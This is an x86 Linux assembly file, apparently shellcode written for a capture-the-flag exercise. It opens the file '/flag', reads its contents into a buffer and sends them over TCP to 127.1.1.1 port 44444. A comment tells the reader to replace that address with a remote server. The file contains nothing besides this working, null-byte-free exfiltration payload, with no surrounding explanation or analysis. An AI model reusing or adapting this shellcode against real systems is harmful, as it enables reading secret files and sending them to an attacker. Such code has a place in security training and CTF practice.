BITS 32

section .text
global _start

_start:
    xor eax, eax
    push eax
    push 0x67616C66 ; 
    push 0x2F2F2F2F ; Path: ////flag 0x00

    ;int openat(int dirfd, const char *pathname, int flags) syscall 0x127
    mov ax, 0x127
    mov bx, -100   ; AT_FDCWD
    mov ecx, esp   ; from pushes
    xor edx, edx   ; O_RDONLY (0)
    int 0x80

    ; ssize_t readv(int fd, const struct iovec *iov, int iovcnt) syscall 0x91
    mov ebx, eax  ; FD in EBX
    sub esp, 0x78 ; reserve 120 bytes for 
    mov ecx, esp  ;
    mov edi, ecx  ; Save buffer address for later usage
    push 0x78     ; iov_len
    push ecx      ; point to this buffer (*iov_base)
    mov ecx, esp
    push ecx      ; point to iovec struct
    xor eax, eax  
    mov al, 0x91
    inc edx       ; iovcnt = 1
    int 0x80
    mov edx, eax  ; Save the length of the string in edx

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; sockfd = socket(socket_family = 2 (PF_INET), socket_type = 1 (SOCK_STREAM), protocol = 0)
    xor eax, eax
    mov al, 0x66 ; sys_socketcall
    xor ebx, ebx
    push ebx      ; push 0 (protocol)
    inc ebx       ; 
    push ebx      ; socket_type = 1 (SOCK_STREAM)
    inc ebx
    push ebx      ; socket_family = 2 (PF_INET)
    dec ebx       ; SYS_SOCKET ebx = 1 
    mov ecx, esp  ; ecx contains reference to socket arguments we just pushed
    int 0x80
    mov esi, eax  ; Save sockfd

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; connect(sockfd, &sockaddr, addrlen)    
    xor eax, eax
    mov al, 0x66 ; sys_socketcall
    push DWORD 0x0101017f ; 127.1.1.1 to avoid null bytes, replace this with remote server
    push WORD 0x9cad  ; port 44444
    inc ebx      ; AF_INET = 2
    push bx      ; push AF_INET
    mov ecx, esp ; sockaddr pointer
    push BYTE 16 ; sizeof(sockaddr) = 16
    push ecx     ; pointer to sockaddr
    push esi     ; pointer to sockfd
    mov ecx, esp ; socket arguments to socketcall
    inc ebx      ; SYS_CONNECT, ebx = 3
    int 0x80

    ; int socketcall(int call, unsigned long *args) syscall 0x66
    ; ssize_t send(int sockfd, const void *buf, size_t len, int flags);
    xor eax, eax
    push eax     ; flags = 0
    mov al, 0x66 ; sys_socketcall
    push edx     ; buf_len (previously saved in edx)
    push edi     ; buf
    push esi     ; sockfd
    mov ecx, esp ; socket arguments to socketcall
    mov bl, 0x9  ; SOCKET_SEND
    int 0x80

    ;int exit(0)
    mov al, 1
    xor ebx, ebx
    int 0x80